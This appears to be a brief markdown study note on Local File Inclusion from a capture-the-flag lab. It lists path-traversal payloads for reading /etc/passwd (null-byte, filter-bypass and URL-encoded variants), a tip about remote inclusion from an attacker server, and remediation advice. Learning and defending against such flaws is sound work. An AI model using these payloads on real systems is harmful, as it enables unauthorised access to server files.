# LFI

# Notes
1. Try POST Request in file inclusion urls.
2. For RFI try to include any file from Remote server(Attacker Server)

## Payloads
../../../../etc/passwd%00
../../../../etc/passwd/.
....//....//....//....//etc/passwd
%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2f%2e%2e%2e%2e%2f%2fetc%2fpasswd
cookie: THM=admin

## Remediation
- Update to latest version of system and services
- Don't show errors in webpage
- Disable certain features, like allow_url_fopen or allow_url_include
- Never trust user input
- Whitelist only allowed files